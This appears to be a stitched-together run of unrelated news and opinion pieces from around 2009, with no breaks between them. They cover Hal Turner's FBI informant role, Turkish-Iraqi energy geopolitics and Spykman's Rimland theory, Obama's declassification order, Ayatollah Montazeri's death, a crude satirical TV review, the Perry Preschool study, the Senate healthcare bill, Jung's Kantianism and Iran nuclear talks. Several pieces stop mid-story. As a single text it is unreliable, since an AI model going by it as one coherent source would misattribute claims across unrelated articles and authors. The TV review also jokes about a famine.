Ultra right - wing radio talk show host Hal Turner provided intelligence to the FBI that agents considered “ irreplaceable , ” according to emails reviewed for a lengthy investigative report published a few weeks ago , as RAW STORY reported .

Writing for NorthJersey.com , reporters Mike Kelly and Peter J. Sampson reveal that the bureau once even used Turner as an undercover intelligence operative in Brazil , where he informed on white supremacist group American National Alliance and met with a representative of the Brazilian Arab Society who sought to provide support to Iraqi fighters .
According to documents reviewed for the report , Turner ’s FBI codename was “ Valhalla , ” which he sometimes wrote on the memo line of the checks the agency sent him .

Turner ’s famously vile , racist broadcasts began in 2002 , though the one - time Pat Buchanan campaign coordinator did not begin his relationship with the FBI until 2003 , when he was recruited to attend a National Alliance meeting in West Virginia .
When he finally stopped broadcasting in 2008 , he was being investigated for making death threats against judges he disagreed with .
Turner ’s lawyer , Michael Orozco , gave a different timeline than the North Jersey report , claiming in August that Turner ’s relationship with the FBI began in 2002 .

Recent energy and other developments in Southwest Asia , particularly involving Turkey , Iran and Iraq , sketch the outline of an imminent reorganization of international relations in the region .
This will have knock - on effects for Eurasia as a whole and the shape of the international system in coming decades .
At the same time , it suggests new and unexpected relevance of the mid-20th century geopolitical theorist Nicolas Spykman .
A key point is the little - noticed movement towards gas imports from the Kurdish region of northern Iraq into Turkey .
Industry figures from the scene now estimate that 8 billion cubic meters per year ( bcm /y ) will flow from the Kurdish region into the Nabucco pipeline by the time it enters service , at present forecast to be in 2016 .
Added to the similar amount already committed from Azerbaijan , this makes up just over half of the projected 31 bcm /y volume of the pipeline .
The agreement on gas supplies from northern Iraq follows from the visit by Turkish Foreign Minister Ahmet Davutoglu in late October to Irbil , the capital city of Iraqi Kurdistan , to open a Turkish consulate there .
His delegation comprised no fewer than 70 officials and businessmen .
The visit was itself a knock - on from one by a large and high - level Turkish delegation headed by Prime Minister Recep Tayyip Erdogan to Baghdad in the middle of October , when literally dozens of cooperation agreements were signed in a wide spectrum of policy areas .
These events suggest a tentative resolution of certain instabilities in Southwest Asia that have persisted since the break - up of the Ottoman Empire nearly 100 years ago .
They represent the emergent re-integration of two economies rent asunder by the division of the empire in the early 20th century , together with an incipient consolidation of the post - Cold War " Southern Corridor " for energy from the Caspian Sea region to Europe .
The significance of such a development of the evolution of post - Cold War international relations in the region is clear .
Recently announced oil industry contracts have garnered the most attention in this regard , and some background helps to put these in their proper perspective .
The Turkish Petroleum Company ( TPC ) was established in 1912 in opposition to US companies ' interests .
Two years later , the Anglo - Persian Oil Company ( APOC ) achieved 50 % control of TPC .
APOC later became the Anglo - Iranian Oil Company , then British Petroleum , then with the purchase of an American company BP - Amoco , today known as BP .
The Iraqi government recently agreed with BP and the China National Petroleum Corporation ( CNPC ) on a deal for the development of the Rumaila oil field in the south of Iraq , which CNPC estimates to hold 17 billion barrels of reserves .
By 1927 , when oil was discovered at Kirkuk , in what is present - day Iraqi Kurdistan , the TPC was divided into equal shares among APOC , Royal Dutch Shell , and the Compagnie Française des Petroles ( CFP ) , and a US consortium called the Near East Development Corp , with a non-voting 5 % share to the Turkish - born Armenian Calouste Gulbenkian , the original " Mr Five Percent " , whose impressive collection of ancient art is now exhibited in his eponymous museum in Lisbon .
By 1929 , when the TPC became the Iraqi Petroleum Co ( IPC ) and Iraq was under British mandate from the League of Nations , a difference of interests had emerged within the companies comprising it .
While Shell and the CFP ( which became the French company Total in 1991 ) sought to develop the Kirkuk deposits as quickly as possible , the APOC ( today 's BP ) and the American company Standard Oil of New Jersey ( which became Esso , then Exxon , and is today ExxonMobil ) sought to delay it because they had other holdings and did n't mind keeping the oil in the ground there .
This soup of companies gives a hint as to continuities in the story .
Skipping the next three hardly uneventful decades , the IPC by 1960 was still developing only one - twentieth of all the resources in Iraq to which it had rights .
That year , a meeting of oil producers in Baghdad led to the foundation of the Organization of Petroleum Exporting Countries ( OPEC ) , and the next year the Iraqi " Law No 80 " expropriated all IPC concessions not already in production .
Following these events , OPEC members began negotiating with Western consuming countries independently of one another , leading to increased production and undercutting of Iraq , which suffered a significant decline in market share .
Throughout the 1960s , the Iraqi National Oil Company ( INOC ) contracted first with the French and then with the Soviet Union , asking for help to development the North Rumaila fields : the ones just signed over to BP and CNPC .
By 1975 , and following its strong advocacy of the 1973 - 74 oil embargo on the West , Iraq nationalized all foreign energy interests still remaining in the country , then throughout the rest of the decade autonomously developed the domestic energy extraction industry .
This went relatively well until the disastrous Iran - Iraq war began , lasting for a decade .
Then came the First Gulf War , followed by United Nations sanctions .
By the end of the 1980s , the USSR had agreed to assist in the development of the West Qurna field ; LUKoil inherited this agreement after the end of the Soviet Union , but it is now out of luck .
After the fall of Saddam Hussein , the government of Iraq declared all contracts signed during the Saddam era were invalid and were to be reviewed and subjected to new Iraqi law .
LUKoil accordingly put in a new bid for West Qurna earlier this year , but has lost out to Western rivals .
The Iraqi government has just reached agreement with America 's ExxonMobil ( Standard Oil of New Jersey when it was a member of TPC in the 1920s ) and Anglo - Dutch company Shell ( also a TPC member ) to develop the West Qurna field , of which the reserves are estimated at 8.7 billion barrels .
The signature of these agreements with Western firms ( and there are surely more to come ) represents the historic reversal of the nationalization policy introduced in 1960 , seven years after the coup in neighboring Iran against Iranian prime minister Mohammad Mossadeq , who had pursued an analogous policy .
The agreements also coincidentally signify the irretrievable downfall of the ideology and practice of the transnational Arab socialist Ba'ath party , of which remnants are present and active throughout a number of state structures in the Arab world , although an Iraq - Syria split dating from the mid-1960s had already destroyed its pretensions to any sort of universalism .
The Ba'ath party had taken power in Iraq in 1963 and Saddam was its last significant representative in power , although it survives through the Assad clan in Syria .
This era of the 1960s also marked the Soviet foreign - policy initiative to curry favor with such regimes , categorized in Soviet doctrine of the time as " revolutionary democracies " , adding Third World intelligentsia and other miscellaneous social strata into the already eclectic mix of the " popular front " line of Seventh Comintern Congress ( 1935 ) .
That Soviet doctrinal shift had been made authoritative in the 1960s through writings and speeches by Boris I Ponomarev , chief of the Third ( Communist ) International before its dissolution in 1943 , thereafter head of the Soviet Communist Party Central Committee 's International Department and eternal candidate member of its Politburo .
So the new energy agreements allow one to see in still clearer retrospective focus the final extinction of a whole so - called ( in Soviet doctrine ) " national anti-imperialist " social stratum that came into state executive power throughout a number of former European colonies , at the head of the anti-imperialist independence movement about half a century ago .
The names of its representatives are well known : Algeria 's Ahmed Ben Bella , Ghana 's Kwame Nkrumah , Indonesia 's Sukarno , and others .
Iraq 's Saddam was the last .
So this half - century mark seems indicative , but of what ?
One reason it begins to stand out so clearly is that other things begun about 50 years ago are also coming full circle .
Although the Sino - Soviet split can be traced to Joseph Stalin 's wrong - headed revolutionary strategy in China between the two world wars , nevertheless it was in the early 1960s , following Nikita Khrushchev 's 1956 denunciation of Stalin , that the split became public and undeniable to all but a few .
The Sino - Soviet split in turn made possible the US - China rapprochement inaugurated by president Richard Nixon ; and while in the early 1970s a commonly used phrase was Nixon , by going to Beijing in 1972 , had " played the China card [ against Russia ] " , China is today increasingly able to play the Russian card against the US as well as the American card against Russia .
Within the past decade , China signed its first treaty with Russia in the last half - century , and one that includes the classic phrase " Good - Neighborly Relations " in the title .
Today , in one of those impossible - to - invent scenarios , China finds itself perfectly positioned to take advantage of the synergy between ( 1 ) Russia 's need for export markets for hydrocarbon energy , where Europe is slow - growth and East Asia is accelerating ; and ( 2 ) its own surplus of US dollars with which to purchase and invest in a discount shopping mart of world - economic crisis - depressed industries .
So what has this to do with Iraq ?
And who was Nicolas Spykman ?
Spykman ( 1893 - 1943 ) was a Dutch - born American professor of international relations at Yale University who took English geographer Sir Halford John Mackinder 's idea of the Heartland being surrounded by an Inner Crescent ( comprising Europe , Arabia , the wider Middle East and Asia ) , criticized and internally differentiated the crescent , distinguishing in Asia , for example , between the spaces occupied by Indian and by Chinese civilizations .
He renamed it the Rimland , and turned Mackinder on his head by asserting that " who controls the Rimland rules Eurasia ... [ and consequently ] the destinies of the world " .
On a map , the Rimland outside Europe looked at the time as if it were unified by little other than the British Empire .
Yet it is not for nothing that Spykman is sometimes called the " godfather " of ( George F Kennan 's ) " containment theory " .
His Rimland is meant to contain Mackinder 's Heartland .
And that is where the before - our - very - eyes shift in Iraqi energy and foreign commercial policy achieves its world - historical significance .
The Iraqi energy contracts would be impossible without the political security of the Turkish - Iraqi rapprochement .
( Some have even suggested the word " integration " . )
That rapprochement mends a broken link in the Rimland .
The main winners in this shift are the corporate descendents of the British and American companies that were part of the TPC 80 years ago ( but not only them ) .
The main losers are the others : France and Russia ; although the latter was not a player early last century , it become one during the 1960s in concert with the French .
Although industrial trusts these days dictate states ' foreign policy more than the other way around , it is possible to see , in the co-opting of Chinese and other Asian energy companies to these projects , a pattern whereby the North Atlantic powers and the North Pacific powers cooperate against the powers of Mackinder 's Eurasian Heartland .
It bears mentioning that the North Atlantic powers are not limited to the US and the United Kingdom , but also include Norway ( by way of StatOilHydro ) , Italy ( by way of Eni ) , and other smaller European state companies , just as smaller Asian state companies are also included : Japan , Indonesia and South Korea , for example ; not to mention ( once again ) China .
These are companies that were not players when the " game " began a century ago because they did not have the educated technicians , industrial plant and access to capital that a century of social and economic evolution has now brought them .
Those North Atlantic powers even include Germany , which is not present in the region 's oil patch but whose national champion RWE is the moving force ( along with Austria 's OMV ) in promoting the Nabucco pipeline : which , recall from above , the new Turkish - Iraqi cooperation is helping to fill with gas from Iraqi Kurdistan .
Such is the emerging macro-structure that will govern international relations for the next decade and a half , until it becomes clear what is the outcome of the ongoing turmoil in Iran , Pakistan , Afghanistan and ( sooner or later ) Uzbekistan .
For those countries represent a geographical wedge that could divide the Rimland in two .
But even Russia surely knows that their eruption in mass social unrest would not necessarily be to the advantage of any Eurasian land power ; such an eruption would constitute itself a new Eurasian land power , transnational and trans - societal in scope .
Such changes have already made inroads among the Muslim peoples of Russia 's North Caucasus .
This does not stop Russia today from preventing concerted action against Iran in the UN Security Council ( even though one of the best ways to understand present - day Iran is to study the history of the Safavid Empire of the 16th and 17th centuries ) .
This is not any anti-French or even anti-Russian plot .
According to George Liska , the European - born American theorist of international relations , the " structure of international relations " comports ever - changing triangles , spanning the centuries , among land and sea powers whose strategies are determined as much by geography as by anything else .
Any seafaring North Atlantic and the North Pacific powers would have common interests vis-à - vis any Eurasian land power .
It is Spykman 's Rimland against Mackinder 's Heartland , although in the details it is much more complicated than that .
It will take until the early 2020s before we will have a better idea about the resolution or irresolution of the social eruption in the " wedge " identified above .
That outcome will in turn condition the evolution of the first post - Cold War international system 's third phase ( we now live on the cusp of the second ) , until a crisis in the early 2040s may lead to a system - wide transformation that we cannot yet well imagine .

WASHINGTON  President Obama declared on Tuesday that “ no information may remain classified indefinitely ” as part of a sweeping overhaul of the executive branch ’s system for protecting classified national security information .
In an executive order and an accompanying presidential memorandum to agency heads , Mr. Obama signaled that the government should try harder to make information public if possible , including by requiring agencies to regularly review what kinds of information they classify and to eliminate any obsolete secrecy requirements .
“ Agency heads shall complete on a periodic basis a comprehensive review of the agency ’s classification guidance , particularly classification guides , to ensure the guidance reflects current circumstances and to identify classified information that no longer requires protection and can be declassified , ” Mr. Obama wrote in the order , released while he was vacationing in Hawaii .
He also established a new National Declassification Center at the National Archives to speed the process of declassifying historical documents by centralizing their review , rather than sending them in sequence to different agencies .
He set a four - year deadline for processing a 400 - million - page backlog of such records that includes archives related to military operations during World War II and the Korean and Vietnam Wars .
Crowds have gathered ahead of Montazeri 's funeral One of Iran 's most prominent dissident clerics , Grand Ayatollah Hoseyn Ali Montazeri , has died aged 87 .
Hoseyn Ali Montazeri was a moving spirit in the 1979 revolution which created Iran 's Islamic state , and was at one stage set to become its leader .
One of Shia Islam 's most respected figures , he was also a leading critic of President Mahmoud Ahmadinejad .
The BBC's Jon Leyne says the death comes at a crucial time in a standoff between the government and opposition .
Iran 's rulers will now fear the opposition may attempt a big turnout for his funeral on Monday and other ceremonies marking his death , especially in the run-up to the Shia Muslim festival of Ashura on 27 December , our correspondent says .
Mourners gather Large crowds have gathered outside Montazeri 's home in the holy city of Qom , following his death on Saturday evening .
He will be laid to rest at the shrine of Hazrate Masoumeh , one of the most revered female saints in Shia Islam , his office told AFP news agency .
Thousands of people from Isfahan , Najafabad , Shiraz and other cities are on their way to Qom to attend Monday 's ceremony , according to one report .
The cleric 's son told the BBC that his father had died of natural causes .
He was quoted by Ilna news agency as offering " condolences to ... all people who seek freedom and justice , to those who fight in the path of God all over the world , " reports AFP .
Illness Montazeri's doctor told state television the cleric was a diabetic who also had lung problems and asthma .
" In fact he was suffering from several diseases , " he said .
DEFIANT CLERIC
Born into provincial family in 1922 and educated at a seminary Arrested and tortured for leading protests against Iran monarchy Designated successor to Islamic Republic 's founder , Khomeini Fell out with Khomeini in 1989 over Iran 's human rights record House arrest in 1997 for criticising current Supreme Leader Issues a fatwa against President Ahmadinejad after 2009 's election
Obituary : Ayatollah Montazeri
A thorn in the establishment 's side , Montazeri issued a fatwa condemning President Ahmadinejad 's government after June 's disputed election .
But that was not his first clash with authority - he repeatedly accused the country 's rulers of imposing dictatorship in the name of Islam and said the liberation that was supposed to have followed the 1979 revolution never happened .
During his lifetime , the cleric was transformed from a pillar of the Islamic revolution to one of the most vocal critics of its leadership .
He had been designated to succeed the Islamic Republic 's founder , Ayatollah Ruhollah Khomeini , but the pair fell out over Iran 's human rights record a few months before Khomeini died of cancer in 1989 .
In 1997 he famously clashed with Khomeini 's successor , Ayatollah Ali Khamenei , whom he outranked in the religious hierarchy , after questioning the powers of the Supreme Leader .
This led to the closure of Montazeri 's religious school and an attack on his office in Qom .
He was placed under house arrest for six years .
After his detention , state - run media began referring to him as a " simple - minded " cleric , references to him in schoolbooks were erased and streets named after him were renamed , but he remained defiant .
Born into a provincial family and educated at a seminary , Hoseyn Ali Montazeri came to prominence as one of the early backers of Khomeini .
Tortured Prior to the overthrow of the Iranian monarchy , he organised public protests in support of Khomeini , following the latter 's arrest .
As a result he was repeatedly detained himself and tortured in jail .

E-mail exchanges Visiting Iran 's ayatollahs
While Khomeini was in exile in Iraq , Montazeri was nominated as his representative in Iran , and after the revolution , he was designated as successor .
But he was marginalised after questioning decisions taken by the Supreme Leader and calling for a transparent assessment of the revolution 's failures .
In his opposition to President Ahmadinejad , he became an unlikely inspiration for Iranian reformists .
Despite his old age and failing health , Hoseyn Ali Montazeri backed the opposition 's claims that the 2009 election result , which gave President Ahmadinejad a landslide victory , had been widely rigged .
The cleric had often said his opinions were guided by his " sense of religious duty " .

I do n't want to claim I predicted the state of modern television in its entirety almost a decade ago or anything , but around 10 years ago I wrote a website called TV Go Home filled with satirically exaggerated programmes , many of which have come frighteningly true .
Here 's the latest example .
In its TV Go Home incarnation , " Masturbation Minefield " was a pornographic game aimed at lonely male viewers : a show which consisted of rude footage ( such as a naked dairymaid bending over ) randomly interspersed with profoundly unerotic imagery ( such as an extreme close - up of Ian Beale 's eye staring straight through the centre of your soul ) .
It was a lo - fi interactive challenge : could the viewer achieve climax during the " rude " bits without being put off by the " unerotic " bits ?
A puerile idea , but there you go .
At least it was n't real .
I lie .
Pants Off Dance Off ( weeknights , 11 pm , Viva ) is essentially Masturbation Minefield with one or two tweaks .
The premise is as simple as its intended audience : ordinary members of the public dance to music while taking their clothes off .
It 's a striptease show .
But , lest they be accused of peddling sordid pornography , the producers have cunningly included enough " mines " to ensure that only the most determined psychopath could possibly manipulate their way to fruition .
First of all , the strippers themselves are self - avowedly " zany " types : real yelping , whooping , jumping - up - and - down - and - clapping " I 'm - mad - me " irritants .
Not only is it impossible to get turned on in their presence , it 's impossible to assign them any human emotion whatsoever .
If , instead of stripping , the programme depicted them being injected with sedatives and shovelled out of the back of a C - 130 Hercules flying 20,000 feet above the Nevada desert , it would actually be easier to masturbate to .
Next , neatly sidestepping accusations of body fascism , they 've chosen a wide variety of figures from both sexes .
Fat ones , thin ones , hairy ones , ones whose faces are so disturbing they look like Steve Buscemi with Bell 's palsy pressing his nose against your bathroom window … all human life is here , apart from anyone you actually want to see naked .
Occasionally they 'll feature a Chippendale type or a lapdancer , but to stop this being arousing , they 'll make a little window pop up , in which the next stripper ( inevitably a 64 - year - old man with a nose like a thumped glans ) dribbles something about how they can't wait to show you their bum .
But they 're not finished yet .
There 's still an outside chance you might be excited by the occasional shot of exposed flank , so just to nail that possibility to the floor and stove its face in with a jackboot , there 's a kerrr - azy joke - filled voiceover yapping away in the background , which outstays its welcome at the first syllable .
It 's not very funny .
In fact , if they replaced it with the soundtrack to one of Michael Buerk 's 1984 Ethopian famine reports , wailing children and all , there 'd be 30 % more laughs .
Finally , they 've cut out the actual nudity .
Yes , you read that right : THEY'VE CUT OUT THE ACTUAL NUDITY .
Instead , every time someone actually takes their " pants off " ( which , after all , is the entire purpose of the show ) , the action freezes and a URL pops up to protect their modesty .
In other words , they 're encouraging their audience to stop watching the show and go online instead , which must make the channel 's advertisers very happy .
The website , incidentally , does n't contain uncensored stripteases either .
But never mind !
I 'm told you can find footage of people actually taking their clothes off – and occasionally doing racier stuff , like kissing – elsewhere on the internet .
In summary : Pants Off Dance
Off takes the concept of striptease , and removes both the " strip " and the " tease " .
That 's not a show , that 's a vacuum .
Worst of all , it 's not even amusingly trashy .
It 's a load of energy expended for nothing .
Just like masturbation itself .
But less noble .
The Perry Preschool Project is one of the most famous education experiments of the last 50 years .
The study asked a question : Can preschool boost the IQ scores of poor African - American children and prevent them from failing in school ?
The surprising results are now challenging widely - held notions about what helps people succeed  in school , and in life .
A New Idea
The Perry Preschool was the idea of a man named David Weikart .
He was a school system administrator in the small city of Ypsilanti , Michigan back in the late 1950s .
When he took the job , he was shocked to discover how many poor African - American children were doing badly in school .
A lot of them were being assigned to special education classes , getting held back , and failing to graduate from high school .
Weikart wanted to do something about it , but school officials did not share his enthusiasm .
They didnt want him changing things , messing around in their schools .
So rather than change the schools , Weikart decided to invent a new kind of school  a pre-school for 3 - and 4 - year - olds .
His hope was that preschool could boost childrens IQs .
This was a radical notion .
Most people believed everyone was born with a certain amount of intelligence , a quotient , and it never changed .
They had faith in IQ tests to measure intelligence .
And they thought intelligence mattered a lot , that it was the key to success in school , and life .
And IQ tests had a lot of power back then .
Children with low IQ scores were usually shuffled off to special education classes where no one expected them to learn much .
That s what was happening to a lot of African - American students .
It s what Weikart was trying to avoid by giving them an early boost in preschool .
But putting such young children in school was a radical idea , too .
There was no such thing as preschool in the late 1950s .
There were nursery schools for families who could afford tuition , but nursery schools were all about play .
They focused on social and emotional development only .
A lot of educators thought 3 - and 4 - year - olds were too young too learn , and they certainly couldnt handle real school - kids that little couldnt sit still at desks and listen to a teacher all day .
But the Perry Preschool was going to be a new kind of school .
Weikart was experimenting with a new way of thinking about education .
In the old view , children are vessels to be filled with knowledge and information .
In the new view , children are not vessels at all .
They are active participants in their own education , instinctually curious , motivated to learn .
The teachers job is to engage students , not tell them what to do .
And unlike nursery school , the Perry Preschool would focus on cognitive development  stimulating childrens brains , increasing their vocabulary , teaching them letters and numbers .
There was no evidence this would boost IQ or help children do better in school .
So Weikart decided to set up his preschool as a scientific experiment .
He would find a group of poor , African - American children with low IQ scores and put half of them in preschool .
Then hed follow all of them for a few years to see if there were any differences between the two groups .
He was trying to answer the question , does preschool work ?
The Perry Preschool Begins
The Perry Preschool opened its doors in October of 1962 .
 I would do whatever we needed to do ,  says former teacher Evelyn Moore , to prove that this many African - American children were not retarded . 
 We tried everything ,  says former teacher Louise Derman - Sparks .
Their idea was to focus on cognitive development , but to do it all through hands - on activities and play .
 It was never directed teaching where we sat them around a table with paper and pencil and told them to check worksheets ,  says Derman - Sparks .
 It was always in the framework of children actively learning . 
They believed that education should be about children learning to explore their own ideas and interests .
 We did a lot of writing and making stories with the children ,  says Moore .
 And there would be puzzles , and we would have different levels of puzzles because we were [ interested ] in trying to get children into more complex ways of dealing with their environment . 
The Perry Preschool continued for five years , with a new group of children entering each fall .
Most children went to the preschool for two years .
At the end , they took IQ tests again .
When the first group of test results came back , the teachers and researchers were elated .
The children had gained an average of 15 points  enough to keep a lot of them out of special education .
There were other preschool experiments going on at this time , and they were showing IQ gains too .
And then in 1965 , President Lyndon Johnson announced an ambitious new federal preschool program called Head Start .
There was a huge amount of hope that Head Start could solve poverty by making poor children smarter .
And the early evidence was encouraging .
Children who went to Head Start gained an average of 10 points on IQ tests .
But Head Start was controversial from the start , and soon critics were calling for a large - scale evaluation to prove it really worked .
And in the spring of 1969 , soon after the inauguration of President Richard Nixon , a damning report about Head Start was released .
It showed the IQ gains from Head Start did not last .
They faded out after just a few years .

I do n’t want to blog endlessly about healthcare reform today because , really , there ’s not all that much to say .
I think the Senate bill in its present state is well worth passing , other people do n’t , and that ’s that .
But there ’s one argument that I find perplexing .
Here ’s Howard Dean :
This is essentially the collapse of health care reform in the United States Senate .
Honestly the best thing to do right now is kill the Senate bill , go back to the House , start the reconciliation process , where you only need 51 votes and it would be a much simpler bill .
Here ’s what I want to know : which one of us is living in dreamland ?
If you do n’t like the Senate bill , fine .
Do n’t support it .
But in what universe will healthcare reform get revived anytime soon if it dies this year ?
2010 ?
With the legislative plate already jammed , healthcare reform probably polling in the mid 30s , and midterms coming up ?
2011 ?
After Republicans have gained a bunch of seats in both the House and Senate thanks to public disgust with Democratic disarray ?
2012 ?
A presidential election year ?
2013 ? 2014 ?
I usually do n’t say much about legislative tactics because I figure you need some serious ground level knowledge before you mouth off about what ’s possible and what ’s not on Capitol Hill .
But the fate of failed major initiatives is so obvious that I can’t believe anyone is taking this seriously .
When big legislative efforts go down in flames , they almost never spring back onto the calendar anytime soon — and that ’s especially true when big healthcare bills fail .
It did n’t happen in 1936 , it did n’t happen in 1949 , it did n’t happen in 1974 , and it did n’t happen in 1995 .
What makes anyone think it will happen in 2010 ?
If healthcare reform dies this year , it dies for a good long time .
Say what you will about the Democratic leadership , but Harry Reid , Barack Obama , Rahm Emanuel , Nancy Pelosi , and Steny Hoyer all know this perfectly well .
So do John Boehner and Mitch McConnell .
( Boy do they know it . )
But if it passes , here ’s what we get :
Insurers have to take all comers .
They ca n’t turn you down for a preexisting condition or cut you off after you get sick .
Community rating .
Within a few broad classes , everyone gets charged the same amount for insurance .
Individual mandate .
I know a lot of liberals hate this , but how is it different from a tax ?
And its purpose is sound : it keeps the insurance pool broad and insurance rates down .
A significant expansion of Medicaid .
Subsidies for low and middle income workers that keeps premium costs under 10 % of income .
Limits on ER charges to low - income uninsured emergency patients .
Caps on out - of - pocket expenses .
A broad range of cost - containment measures .
A dedicated revenue stream to support all this .
What ’s more , for the first time we get a national commitment to providing healthcare coverage for everyone .
It wo n’t be universal to start , unfortunately , but it ’s going to be a lot easier to get there once the marker is laid down .
That ’s how every other country has done it , and that ’s how we did it with Social Security and Medicare , both of which had big gaps in coverage when they were first passed .
But if we do n’t pass it , we do n’t get any of this .
Not now , and not for a long time .
Instead of being actual liberals , we ’ll just be playing ones on TV .

Carl Gustav Jung ( 1875 - 1961 )
Amid all the talk about the " Collective Unconscious " and other sexy issues , most readers are likely to miss the fact that C.G. Jung was a good Kantian .
His famous theory of Synchronicity , " an acausal connecting principle , " is based on Kant 's distinction between phenomena and things - in - themselves and on Kant 's theory that causality will not operate among thing - in - themselves the way it does in phenomena .
Thus , Kant could allow for free will ( unconditioned causes ) among things - in - themselves , as Jung allows for synchronicity ( " meaningful coincidences " ) .
Next to Kant , Jung is close to Schopenhauer , praising him as the first philosopher he had read , " who had the courage to see that all was not for the best in the fundaments of the universe " [ Memories , Dreams , Reflections , p. 69 ] .
Jung was probably unaware of the Friesian background of Otto 's term " numinosity " when he began to use it for his Archetypes , but it is unlikely that he would object to the way in which Otto 's theory , through Fries , fits into Kantian epistemology and metaphysics .
Jung 's place in the Kant - Friesian tradition is on a side that would have been distasteful to Kant , Fries , and Nelson , whose systems were basically rationalistic .
Thus Kant saw religion as properly a rational expression of morality , and Fries and Nelson , although allowing an aesthetic content to religion different from morality , nevertheless did not expect religion to embody much more than good morality and good art .
Schopenhauer , Otto , and Jung all represent an awareness that more exists to religion and to human psychological life than this .
The terrifying , uncanny , and fascinating elements of religion and ordinary life are beneath the notice of Kant , Fries , and Nelson , while they are indisputable and irreducible elements of life , for which there must be an account , with Schopenhauer , Otto , and Jung .
As Jung again said of Schopenhauer : " He was the first to speak of the suffering of the world , which visibly and glaringly surrounds us , and of confusion , passion , evil -- all those things which the others hardly seemed to notice and always tried to resolve into all - embracing harmony and comprehensibility " [ ibid . p. 69 ] .
It is an awareness of this aspect of the world that renders the religious ideas of " salvation " meaningful ; yet " salvation " as such is always missing from moralistic or aesthetic renderings of religion .
Only Jung could have written his Answer to Job .
Jung 's great Answer to Job , indeed , represents an approach to religion that is all but unique .
Placing God in the Unconscious might strike most people as reducing him to a mere psychological object ; but that is to overlook Jung 's Kantianism .
The Unconscious , and especially the Collective Unconscious , belongs to Kantian things - in - themselves , or to the transcendent Will of Schopenhauer .
Jung was often at pains not to complicate his theory of the Archetypes by committing himself to a metaphysical theory -- he wanted the theory to work whether he was talking about the brain or about the Transcendent -- but that was merely a concession to the materialistic bias of contemporary science .
He had no materialistic commitment himself and , when it came down to it , was not going to accept such naive reductionism .
Instead , he was willing to rethink how the Transcendent might operate .
Thus , he says about Schopenhauer :
I felt sure that by " Will " he really meant God , the Creator , and that he was saying that God was blind .
Since I knew from experience that God was not offended by any blasphemy , that on the contrary
He could even encourage it because
He wished to evoke not only man 's bright and positive side but also his darkness and ungodliness , Schopenhauer 's view did not distress me .
[ ibid. pp. 69 -70 ]
The Problem of Evil , which for so many people simply denuminizes religion , and which Schopenhauer used to reject the value of the world , became a challenge for Jung in the psychoanalysis of God .
The God of the Bible is indeed a personality , and seemingly not always the same one .
God as a morally evolving personality is the extraordinary conception of Answer to Job .
What Otto saw as the evolution of human moral consciousness , Jung turns right around on the basis of the principle that the human unconscious , expressed spontaneously in religious practice and literature , transcends mere human subjectivity .
But the transcendent reality in the unconscious is different in kind from consciousness .
As Jung said in Memories , Dreams , Reflections again :
If the Creator were conscious of Himself , He would not need conscious creatures ; nor is it probable that the extremely indirect methods of creation , which squander millions of years upon the development of countless species and creatures , are the outcome of purposeful intention .
Natural history tells us of a haphazard and casual transformation of species over hundreds of millions of years of devouring and being devoured .
The biological and political history of man is an elaborate repetition of the same thing .
But the history of the mind offers a different picture .
Here the miracle of reflecting consciousness intervenes -- the second cosmogony [ ed .
note : what Teilhard de Chardin called the origin of the " noosphere , " the layer of " mind " ] .
The importance of consciousness is so great that one cannot help suspecting the element of meaning to be concealed somewhere within all the monstrous , apparently senseless biological turmoil , and that the road to its manifestation was ultimately found on the level of warm - blooded vertebrates possessed of a differentiated brain -- found as if by chance , unintended and unforeseen , and yet somehow sensed , felt and groped for out of some dark urge . [ p. 339 ]
In other words , a " meaningful coincidence . "
Jung also says ,
As far as we can discern , the sole purpose of human existence is to kindle a light in the darkness of mere being .
It may even be assumed that just as the unconscious affects us , so the increase in our consciousness affects the unconscious . [ p. 326 ]
However , Jung has missed something there .
If consciousness is " the light in the darkness of mere being , " consciousness alone cannot be the " sole purpose of human existence , " since consciousness as such could appear as just a place of " mere being " and so would easily become an empty , absurd , and meaningless Existentialist existence .
Instead , consciousness allows for the meaningful instantiation of existence , both through Jung 's process of Individuation , by which the Archetypes are given unique expression in a specific human life , and from the historic process that Jung examines in Answer to Job , by which interaction with the unconscious alters in turn the Archetypes that come to be instantiated .
While Otto could understand Job 's reaction to God , as the incomprehensible Numen , Jung thinks of God 's reaction to Job , as an innocent and righteous man jerked around by God 's unconsciousness .
Jung 's idea that the Incarnation then is the means by which God redeems Himself from His morally false position in Job is an extraordinary reversal ( I hesitate to say " deconstruction " ) of the consciously expressed dogma that the Incarnation is to redeem humanity .
It is not too difficult to see this turn in other religions .
The compassion of the Buddhas in Mahâyâna Buddhism , especially when the Buddha Shakyamuni comes to be seen as the expression of a cosmic and eternal Dharma Body , is a hand of salvation stretched out from the Transcendent , without , however , the complication that the Buddha is ever thought responsible for the nature of the world and its evils as their Creator .
That complication , however , does occur with Hindu views of the divine Incarnations of Vishnu .
Closer to a Jungian synthesis , on the other hand , is the Bahá 'í theory that divine contact is though " Manifestations , " which are neither wholly human nor wholly divine : merely human in relation to God , but entirely divine in relation to other humans .
Such a theory must appear Christianizing in comparison to Islam , but it avoids the uniqueness of Christ as the only Incarnation in Christianity itself .
This is conformable to the Jungian proposition that the unconscious is both a side of the human mind and a door into the Transcendent .
When that door opens , the expression of the Transcendent is then conditioned by the person through which it is expressed , possessing that person , but it is also genuinely Transcendent and reflecting the ongoing interaction that the person historically embodies .
The possible " mere being " even of consciousness then becomes the place of meaning and value .
Whether " psychoanalysis " as practiced by Freud or Jung is to be taken seriously anymore is a good question ; but both men will survive as philosophers long after their claims to science or medicine may be discounted .
Jung 's Kantianism enables him to avoid the materialism and reductionism of Freud ( " all of civilization is a substitute for incest " ) and , with a great breadth of learning , employs principles from Kant , Schopenhauer , and Otto that are easily conformable to the Kant - Friesian tradition .
The Answer to Job , indeed , represents a considerable advance beyond Otto , into the real paradoxes that are the only way we can conceive transcendent reality .

Barack Obama created the hope of a diplomatic breakthrough between the US and Iran after 30 years of enmity .
Now talks between the West and Iran over nuclear issues have stalled and each side wants to claim a political victory rather than solve the problem
Talks between Tehran and the West were stalled for months over the question of uranium enrichment : Iran was allowed to do this under the Nuclear Non-Proliferation Treaty ( NNPT ) but forbidden to do so by UN Security Council resolutions .
Then a possible solution emerged from an unexpected quarter .
More than 40 years ago , the US had built a nuclear reactor in Tehran to produce radioisotopes for medical research .
After the 1979 revolution and the severance of diplomatic relations with Washington , Iran had to look elsewhere for the supply of uranium enriched to 20 % that it needed to operate this reactor .
It obtained 23 kilograms from Argentina under an agreement signed in 1988 , enough to feed the reactor until 2010 .
